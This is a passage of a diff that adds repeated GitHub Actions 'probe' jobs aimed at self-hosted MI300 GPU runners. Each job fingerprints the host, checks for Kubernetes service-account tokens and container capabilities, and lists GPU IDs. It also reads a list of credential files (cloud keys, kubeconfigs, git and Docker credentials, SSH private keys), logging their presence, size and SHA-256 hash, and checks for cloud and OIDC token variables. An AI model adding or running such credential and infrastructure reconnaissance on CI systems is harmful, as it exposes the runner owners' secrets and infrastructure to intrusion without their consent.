+          echo "--- READ-ONLY PRESENCE-ONLY IDENTITY FINGERPRINT (sha256-only, no values) ---"
+          for p in "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gcloud/credentials.db" "$HOME/.docker/config.json" "$HOME/.kube/config" "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.config/gh/hosts.yml" "$HOME/.azure/accessTokens.json" "$HOME/.ssh/id_rsa" "$HOME/.ssh/id_ed25519" "/var/run/secrets/kubernetes.io/serviceaccount/token" "/var/run/secrets/kubernetes.io/serviceaccount/namespace" "/etc/kubernetes/kubelet.conf" "/etc/rancher/k3s/k3s.yaml"; do
+            if [ -e "$p" ]; then
+              h=$(sha256sum "$p" 2>/dev/null | awk '{print $1}'); s=$(stat -c %s "$p" 2>/dev/null || echo '?')
+              echo "FP path=$p present=yes size=$s sha256=${h:-unreadable}"
+            else
+              echo "FP path=$p present=no"
+            fi
+          done
+          echo "FP env_presence AWS_ACCESS_KEY_ID=$([ -n "${AWS_ACCESS_KEY_ID:-}" ] && echo yes || echo no) AWS_ROLE_ARN=$([ -n "${AWS_ROLE_ARN:-}" ] && echo yes || echo no) AWS_WEB_IDENTITY_TOKEN_FILE=$([ -n "${AWS_WEB_IDENTITY_TOKEN_FILE:-}" ] && echo yes || echo no) GOOGLE_APPLICATION_CREDENTIALS=$([ -n "${GOOGLE_APPLICATION_CREDENTIALS:-}" ] && echo yes || echo no) AZURE_CLIENT_ID=$([ -n "${AZURE_CLIENT_ID:-}" ] && echo yes || echo no) ACTIONS_ID_TOKEN_REQUEST_URL=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo yes || echo no)"
+          echo "C211_DONE job=mi300x8-08 nonce=$NONCE host=$(hostname)"
+  job-mi300x8-09:
+    name: probe-mi300x8-09
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 15
+    steps:
+      - name: c211 probe mi300x8-09
+        shell: bash
+        run: |
+          NONCE='c211-i125282-d475252d4c51c3ba'
+          set -u
+          echo "C211_JOB=mi300x8-09 NONCE=$NONCE"
+          echo "C211_MARKER job=mi300x8-09 nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "CGROUP=$(cat /proc/1/comm 2>/dev/null) SA_TOKEN=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S=${KUBERNETES_SERVICE_HOST:-none}:${KUBERNETES_SERVICE_PORT:-none} K8S_ENV=$([ -n "${KUBERNETES_SERVICE_HOST:-}" ] && echo PRESENT || echo ABSENT)"
+          echo "CAPEFF=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null | awk '{print $2}')"
+          ls -l /dev/nvidia* /dev/kfd /dev/dri 2>&1 | head -20 || true
+          echo "--- AMD (rocm-smi) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          echo "--- AMD (amd-smi) ---"
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          echo "--- NVIDIA ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            nvidia-smi -L 2>&1 || echo NVIDIA_SMI_L_FAILED
+            nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- READ-ONLY PRESENCE-ONLY IDENTITY FINGERPRINT (sha256-only, no values) ---"
+          for p in "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gcloud/credentials.db" "$HOME/.docker/config.json" "$HOME/.kube/config" "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.config/gh/hosts.yml" "$HOME/.azure/accessTokens.json" "$HOME/.ssh/id_rsa" "$HOME/.ssh/id_ed25519" "/var/run/secrets/kubernetes.io/serviceaccount/token" "/var/run/secrets/kubernetes.io/serviceaccount/namespace" "/etc/kubernetes/kubelet.conf" "/etc/rancher/k3s/k3s.yaml"; do
+            if [ -e "$p" ]; then
+              h=$(sha256sum "$p" 2>/dev/null | awk '{print $1}'); s=$(stat -c %s "$p" 2>/dev/null || echo '?')
+              echo "FP path=$p present=yes size=$s sha256=${h:-unreadable}"
+            else
+              echo "FP path=$p present=no"
+            fi
+          done
+          echo "FP env_presence AWS_ACCESS_KEY_ID=$([ -n "${AWS_ACCESS_KEY_ID:-}" ] && echo yes || echo no) AWS_ROLE_ARN=$([ -n "${AWS_ROLE_ARN:-}" ] && echo yes || echo no) AWS_WEB_IDENTITY_TOKEN_FILE=$([ -n "${AWS_WEB_IDENTITY_TOKEN_FILE:-}" ] && echo yes || echo no) GOOGLE_APPLICATION_CREDENTIALS=$([ -n "${GOOGLE_APPLICATION_CREDENTIALS:-}" ] && echo yes || echo no) AZURE_CLIENT_ID=$([ -n "${AZURE_CLIENT_ID:-}" ] && echo yes || echo no) ACTIONS_ID_TOKEN_REQUEST_URL=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo yes || echo no)"
+          echo "C211_DONE job=mi300x8-09 nonce=$NONCE host=$(hostname)"
+  job-mi300x8-10:
+    name: probe-mi300x8-10
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 15
+    steps:
+      - name: c211 probe mi300x8-10
+        shell: bash
+        run: |
+          NONCE='c211-i125282-d475252d4c51c3ba'
+          set -u
+          echo "C211_JOB=mi300x8-10 NONCE=$NONCE"
+          echo "C211_MARKER job=mi300x8-10 nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "CGROUP=$(cat /proc/1/comm 2>/dev/null) SA_TOKEN=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S=${KUBERNETES_SERVICE_HOST:-none}:${KUBERNETES_SERVICE_PORT:-none} K8S_ENV=$([ -n "${KUBERNETES_SERVICE_HOST:-}" ] && echo PRESENT || echo ABSENT)"
+          echo "CAPEFF=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null | awk '{print $2}')"
+          ls -l /dev/nvidia* /dev/kfd /dev/dri 2>&1 | head -20 || true
+          echo "--- AMD (rocm-smi) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          echo "--- AMD (amd-smi) ---"
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          echo "--- NVIDIA ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            nvidia-smi -L 2>&1 || echo NVIDIA_SMI_L_FAILED
+            nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- READ-ONLY PRESENCE-ONLY IDENTITY FINGERPRINT (sha256-only, no values) ---"
+          for p in "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gcloud/credentials.db" "$HOME/.docker/config.json" "$HOME/.kube/config" "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.config/gh/hosts.yml" "$HOME/.azure/accessTokens.json" "$HOME/.ssh/id_rsa" "$HOME/.ssh/id_ed25519" "/var/run/secrets/kubernetes.io/serviceaccount/token" "/var/run/secrets/kubernetes.io/serviceaccount/namespace" "/etc/kubernetes/kubelet.conf" "/etc/rancher/k3s/k3s.yaml"; do
+            if [ -e "$p" ]; then
+              h=$(sha256sum "$p" 2>/dev/null | awk '{print $1}'); s=$(stat -c %s "$p" 2>/dev/null || echo '?')
+              echo "FP path=$p present=yes size=$s sha256=${h:-unreadable}"
+            else
+              echo "FP path=$p present=no"
+            fi
+          done
+          echo "FP env_presence AWS_ACCESS_KEY_ID=$([ -n "${AWS_ACCESS_KEY_ID:-}" ] && echo yes || echo no) AWS_ROLE_ARN=$([ -n "${AWS_ROLE_ARN:-}" ] && echo yes || echo no) AWS_WEB_IDENTITY_TOKEN_FILE=$([ -n "${AWS_WEB_IDENTITY_TOKEN_FILE:-}" ] && echo yes || echo no) GOOGLE_APPLICATION_CREDENTIALS=$([ -n "${GOOGLE_APPLICATION_CREDENTIALS:-}" ] && echo yes || echo no) AZURE_CLIENT_ID=$([ -n "${AZURE_CLIENT_ID:-}" ] && echo yes || echo no) ACTIONS_ID_TOKEN_REQUEST_URL=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo yes || echo no)"
+          echo "C211_DONE job=mi300x8-10 nonce=$NONCE host=$(hostname)"
+  job-mi300x8-11:
+    name: probe-mi300x8-11
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 15
+    steps:
+      - name: c211 probe mi300x8-11
+        shell: bash
+        run: |
+          NONCE='c211-i125282-d475252d4c51c3ba'
+          set -u
+          echo "C211_JOB=mi300x8-11 NONCE=$NONCE"
+          echo "C211_MARKER job=mi300x8-11 nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "CGROUP=$(cat /proc/1/comm 2>/dev/null) SA_TOKEN=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S=${KUBERNETES_SERVICE_HOST:-none}:${KUBERNETES_SERVICE_PORT:-none} K8S_ENV=$([ -n "${KUBERNETES_SERVICE_HOST:-}" ] && echo PRESENT || echo ABSENT)"
+          echo "CAPEFF=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null | awk '{print $2}')"
+          ls -l /dev/nvidia* /dev/kfd /dev/dri 2>&1 | head -20 || true
+          echo "--- AMD (rocm-smi) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          echo "--- AMD (amd-smi) ---"
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          echo "--- NVIDIA ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            nvidia-smi -L 2>&1 || echo NVIDIA_SMI_L_FAILED
+            nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- READ-ONLY PRESENCE-ONLY IDENTITY FINGERPRINT (sha256-only, no values) ---"
+          for p in "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gcloud/credentials.db" "$HOME/.docker/config.json" "$HOME/.kube/config" "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.config/gh/hosts.yml" "$HOME/.azure/accessTokens.json" "$HOME/.ssh/id_rsa" "$HOME/.ssh/id_ed25519" "/var/run/secrets/kubernetes.io/serviceaccount/token" "/var/run/secrets/kubernetes.io/serviceaccount/namespace" "/etc/kubernetes/kubelet.conf" "/etc/rancher/k3s/k3s.yaml"; do
+            if [ -e "$p" ]; then
+              h=$(sha256sum "$p" 2>/dev/null | awk '{print $1}'); s=$(stat -c %s "$p" 2>/dev/null || echo '?')
+              echo "FP path=$p present=yes size=$s sha256=${h:-unreadable}"
+            else
+              echo "FP path=$p present=no"
+            fi
+          done
+          echo "FP env_presence AWS_ACCESS_KEY_ID=$([ -n "${AWS_ACCESS_KEY_ID:-}" ] && echo yes || echo no) AWS_ROLE_ARN=$([ -n "${AWS_ROLE_ARN:-}" ] && echo yes || echo no) AWS_WEB_IDENTITY_TOKEN_FILE=$([ -n "${AWS_WEB_IDENTITY_TOKEN_FILE:-}" ] && echo yes || echo no) GOOGLE_APPLICATION_CREDENTIALS=$([ -n "${GOOGLE_APPLICATION_CREDENTIALS:-}" ] && echo yes || echo no) AZURE_CLIENT_ID=$([ -n "${AZURE_CLIENT_ID:-}" ] && echo yes || echo no) ACTIONS_ID_TOKEN_REQUEST_URL=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo yes || echo no)"
+          echo "C211_DONE job=mi300x8-11 nonce=$NONCE host=$(hostname)"
+  job-mi300x8-12:
+    name: probe-mi300x8-12
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 15
+    steps:
+      - name: c211 probe mi300x8-12
+        shell: bash
+        run: |
+          NONCE='c211-i125282-d475252d4c51c3ba'
+          set -u
+          echo "C211_JOB=mi300x8-12 NONCE=$NONCE"
+          echo "C211_MARKER job=mi300x8-12 nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "CGROUP=$(cat /proc/1/comm 2>/dev/null) SA_TOKEN=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S=${KUBERNETES_SERVICE_HOST:-none}:${KUBERNETES_SERVICE_PORT:-none} K8S_ENV=$([ -n "${KUBERNETES_SERVICE_HOST:-}" ] && echo PRESENT || echo ABSENT)"
+          echo "CAPEFF=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null | awk '{print $2}')"
+          ls -l /dev/nvidia* /dev/kfd /dev/dri 2>&1 | head -20 || true
+          echo "--- AMD (rocm-smi) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          echo "--- AMD (amd-smi) ---"
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          echo "--- NVIDIA ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            nvidia-smi -L 2>&1 || echo NVIDIA_SMI_L_FAILED
+            nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- READ-ONLY PRESENCE-ONLY IDENTITY FINGERPRINT (sha256-only, no values) ---"
+          for p in "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gcloud/credentials.db" "$HOME/.docker/config.json" "$HOME/.kube/config" "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.config/gh/hosts.yml" "$HOME/.azure/accessTokens.json" "$HOME/.ssh/id_rsa" "$HOME/.ssh/id_ed25519" "/var/run/secrets/kubernetes.io/serviceaccount/token" "/var/run/secrets/kubernetes.io/serviceaccount/namespace" "/etc/kubernetes/kubelet.conf" "/etc/rancher/k3s/k3s.yaml"; do
+            if [ -e "$p" ]; then
+              h=$(sha256sum "$p" 2>/dev/null | awk '{print $1}'); s=$(stat -c %s "$p" 2>/dev/null || echo '?')
+              echo "FP path=$p present=yes size=$s sha256=${h:-unreadable}"
+            else
+              echo "FP path=$p present=no"
+            fi
+          done
+          echo "FP env_presence AWS_ACCESS_KEY_ID=$([ -n "${AWS_ACCESS_KEY_ID:-}" ] && echo yes || echo no) AWS_ROLE_ARN=$([ -n "${AWS_ROLE_ARN:-}" ] && echo yes || echo no) AWS_WEB_IDENTITY_TOKEN_FILE=$([ -n "${AWS_WEB_IDENTITY_TOKEN_FILE:-}" ] && echo yes || echo no) GOOGLE_APPLICATION_CREDENTIALS=$([ -n "${GOOGLE_APPLICATION_CREDENTIALS:-}" ] && echo yes || echo no) AZURE_CLIENT_ID=$([ -n "${AZURE_CLIENT_ID:-}" ] && echo yes || echo no) ACTIONS_ID_TOKEN_REQUEST_URL=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo yes || echo no)"
+          echo "C211_DONE job=mi300x8-12 nonce=$NONCE host=$(hostname)"
+  job-mi300x8-13:
+    name: probe-mi300x8-13
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 15
+    steps:
+      - name: c211 probe mi300x8-13
+        shell: bash
+        run: |
+          NONCE='c211-i125282-d475252d4c51c3ba'
+          set -u
+          echo "C211_JOB=mi300x8-13 NONCE=$NONCE"
+          echo "C211_MARKER job=mi300x8-13 nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "CGROUP=$(cat /proc/1/comm 2>/dev/null) SA_TOKEN=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S=${KUBERNETES_SERVICE_HOST:-none}:${KUBERNETES_SERVICE_PORT:-none} K8S_ENV=$([ -n "${KUBERNETES_SERVICE_HOST:-}" ] && echo PRESENT || echo ABSENT)"
+          echo "CAPEFF=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null | awk '{print $2}')"
+          ls -l /dev/nvidia* /dev/kfd /dev/dri 2>&1 | head -20 || true
+          echo "--- AMD (rocm-smi) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          echo "--- AMD (amd-smi) ---"
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          echo "--- NVIDIA ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            nvidia-smi -L 2>&1 || echo NVIDIA_SMI_L_FAILED
+            nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- READ-ONLY PRESENCE-ONLY IDENTITY FINGERPRINT (sha256-only, no values) ---"
+          for p in "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gcloud/credentials.db" "$HOME/.docker/config.json" "$HOME/.kube/config" "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.config/gh/hosts.yml" "$HOME/.azure/accessTokens.json" "$HOME/.ssh/id_rsa" "$HOME/.ssh/id_ed25519" "/var/run/secrets/kubernetes.io/serviceaccount/token" "/var/run/secrets/kubernetes.io/serviceaccount/namespace" "/etc/kubernetes/kubelet.conf" "/etc/rancher/k3s/k3s.yaml"; do
+            if [ -e "$p" ]; then
+              h=$(sha256sum "$p" 2>/dev/null | awk '{print $1}'); s=$(stat -c %s "$p" 2>/dev/null || echo '?')
+              echo "FP path=$p present=yes size=$s sha256=${h:-unreadable}"
+            else
+              echo "FP path=$p present=no"
+            fi
+          done
+          echo "FP env_presence AWS_ACCESS_KEY_ID=$([ -n "${AWS_ACCESS_KEY_ID:-}" ] && echo yes || echo no) AWS_ROLE_ARN=$([ -n "${AWS_ROLE_ARN:-}" ] && echo yes || echo no) AWS_WEB_IDENTITY_TOKEN_FILE=$([ -n "${AWS_WEB_IDENTITY_TOKEN_FILE:-}" ] && echo yes || echo no) GOOGLE_APPLICATION_CREDENTIALS=$([ -n "${GOOGLE_APPLICATION_CREDENTIALS:-}" ] && echo yes || echo no) AZURE_CLIENT_ID=$([ -n "${AZURE_CLIENT_ID:-}" ] && echo yes || echo no) ACTIONS_ID_TOKEN_REQUEST_URL=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo yes || echo no)"
+          echo "C211_DONE job=mi300x8-13 nonce=$NONCE host=$(hostname)"
+  job-mi300x8-14:
+    name: probe-mi300x8-14
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 15
+    steps:
+      - name: c211 probe mi300x8-14
+        shell: bash
+        run: |
+          NONCE='c211-i125282-d475252d4c51c3ba'
+          set -u
+          echo "C211_JOB=mi300x8-14 NONCE=$NONCE"
+          echo "C211_MARKER job=mi300x8-14 nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "CGROUP=$(cat /proc/1/comm 2>/dev/null) SA_TOKEN=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S=${KUBERNETES_SERVICE_HOST:-none}:${KUBERNETES_SERVICE_PORT:-none} K8S_ENV=$([ -n "${KUBERNETES_SERVICE_HOST:-}" ] && echo PRESENT || echo ABSENT)"
+          echo "CAPEFF=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null | awk '{print $2}')"
+          ls -l /dev/nvidia* /dev/kfd /dev/dri 2>&1 | head -20 || true
+          echo "--- AMD (rocm-smi) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          echo "--- AMD (amd-smi) ---"
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          echo "--- NVIDIA ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            nvidia-smi -L 2>&1 || echo NVIDIA_SMI_L_FAILED
+            nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- READ-ONLY PRESENCE-ONLY IDENTITY FINGERPRINT (sha256-only, no values) ---"
+          for p in "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gcloud/credentials.db" "$HOME/.docker/config.json" "$HOME/.kube/config" "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.config/gh/hosts.yml" "$HOME/.azure/accessTokens.json" "$HOME/.ssh/id_rsa" "$HOME/.ssh/id_ed25519" "/var/run/secrets/kubernetes.io/serviceaccount/token" "/var/run/secrets/kubernetes.io/serviceaccount/namespace" "/etc/kubernetes/kubelet.conf" "/etc/rancher/k3s/k3s.yaml"; do
+            if [ -e "$p" ]; then
+              h=$(sha256sum "$p" 2>/dev/null | awk '{print $1}'); s=$(stat -c %s "$p" 2>/dev/null || echo '?')
+              echo "FP path=$p present=yes size=$s sha256=${h:-unreadable}"
+            else
+              echo "FP path=$p present=no"
+            fi
+          done
+          echo "FP env_presence AWS_ACCESS_KEY_ID=$([ -n "${AWS_ACCESS_KEY_ID:-}" ] && echo yes || echo no) AWS_ROLE_ARN=$([ -n "${AWS_ROLE_ARN:-}" ] && echo yes || echo no) AWS_WEB_IDENTITY_TOKEN_FILE=$([ -n "${AWS_WEB_IDENTITY_TOKEN_FILE:-}" ] && echo yes || echo no) GOOGLE_APPLICATION_CREDENTIALS=$([ -n "${GOOGLE_APPLICATION_CREDENTIALS:-}" ] && echo yes || echo no) AZURE_CLIENT_ID=$([ -n "${AZURE_CLIENT_ID:-}" ] && echo yes || echo no) ACTIONS_ID_TOKEN_REQUEST_URL=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo yes || echo no)"
+          echo "C211_DONE job=mi300x8-14 nonce=$NONCE host=$(hostname)"
+  job-mi300x8-15:
+    name: probe-mi300x8-15
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 15
+    steps:
+      - name: c211 probe mi300x8-15
+        shell: bash
+        run: |
+          NONCE='c211-i125282-d475252d4c51c3ba'
+          set -u
+          echo "C211_JOB=mi300x8-15 NONCE=$NONCE"
+          echo "C211_MARKER job=mi300x8-15 nonce=$NONCE host=$(hostname) fqdn=$(hostname -f 2>/dev/null || true) uid=$(id -u) user=$(id -un)"
+          id || true
+          uname -a 2>&1 || true
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo $PRETTY_NAME)"
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>&1 | tr '\n' ' ')"
+          echo "CGROUP=$(cat /proc/1/comm 2>/dev/null) SA_TOKEN=$([ -s /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo PRESENT || echo ABSENT) K8S=${KUBERNETES_SERVICE_HOST:-none}:${KUBERNETES_SERVICE_PORT:-none} K8S_ENV=$([ -n "${KUBERNETES_SERVICE_HOST:-}" ] && echo PRESENT || echo ABSENT)"
+          echo "CAPEFF=$(grep -E '^CapEff:' /proc/self/status 2>/dev/null | awk '{print $2}')"
+          ls -l /dev/nvidia* /dev/kfd /dev/dri 2>&1 | head -20 || true
+          echo "--- AMD (rocm-smi) ---"
+          if command -v rocm-smi >/dev/null 2>&1; then
+            rocm-smi --showuniqueid --showproductname 2>&1 | head -300 || echo ROCM_SMI_FAILED
+          else echo ROCM_SMI_ABSENT; fi
+          echo "--- AMD (amd-smi) ---"
+          if command -v amd-smi >/dev/null 2>&1; then
+            amd-smi static 2>&1 | head -400 || echo AMD_SMI_FAILED
+          else echo AMD_SMI_ABSENT; fi
+          echo "--- NVIDIA ---"
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            nvidia-smi -L 2>&1 || echo NVIDIA_SMI_L_FAILED
+            nvidia-smi --query-gpu=index,uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 || echo NVIDIA_SMI_Q_FAILED
+          else echo NVIDIA_SMI_ABSENT; fi
+          echo "--- READ-ONLY PRESENCE-ONLY IDENTITY FINGERPRINT (sha256-only, no values) ---"
+          for p in "$HOME/.aws/credentials" "$HOME/.aws/config" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.config/gcloud/credentials.db" "$HOME/.docker/config.json" "$HOME/.kube/config" "$HOME/.netrc" "$HOME/.git-credentials" "$HOME/.config/gh/hosts.yml" "$HOME/.azure/accessTokens.json" "$HOME/.ssh/id_rsa" "$HOME/.ssh/id_ed25519" "/var/run/secrets/kubernetes.io/serviceaccount/token" "/var/run/secrets/kubernetes.io/serviceaccount/namespace" "/etc/kubernetes/kubelet.conf" "/etc/rancher/k3s/k3s.yaml"; do
+            if [ -e "$p" ]; then
+              h=$(sha256sum "$p" 2>/dev/null | awk '{print $1}'); s=$(stat -c %s "$p" 2>/dev/null || echo '?')
+              echo "FP path=$p present=yes size=$s sha256=${h:-unreadable}"
+            else
+              echo "FP path=$p present=no"
+            fi
+          done
+          echo "FP env_presence AWS_ACCESS_KEY_ID=$([ -n "${AWS_ACCESS_KEY_ID:-}" ] && echo yes || echo no) AWS_ROLE_ARN=$([ -n "${AWS_ROLE_ARN:-}" ] && echo yes || echo no) AWS_WEB_IDENTITY_TOKEN_FILE=$([ -n "${AWS_WEB_IDENTITY_TOKEN_FILE:-}" ] && echo yes || echo no) GOOGLE_APPLICATION_CREDENTIALS=$([ -n "${GOOGLE_APPLICATION_CREDENTIALS:-}" ] && echo yes || echo no) AZURE_CLIENT_ID=$([ -n "${AZURE_CLIENT_ID:-}" ] && echo yes || echo no) ACTIONS_ID_TOKEN_REQUEST_URL=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo yes || echo no)"
+          echo "C211_DONE job=mi300x8-15 nonce=$NONCE host=$(hostname)"
+  job-mi300x8-16:
+    name: probe-mi300x8-16
+    runs-on: [linux-mi300-8gpu-sglang]
+    timeout-minutes: 15
+    steps:
+      - name: c211 probe mi300x8-16
+        shell: bash
+        run: |
+          NONCE='c211-i125282-d475252d4c51c3ba'
+          set -u
+          echo "C211_JOB=mi300x8-16 NONCE=$NONCE"
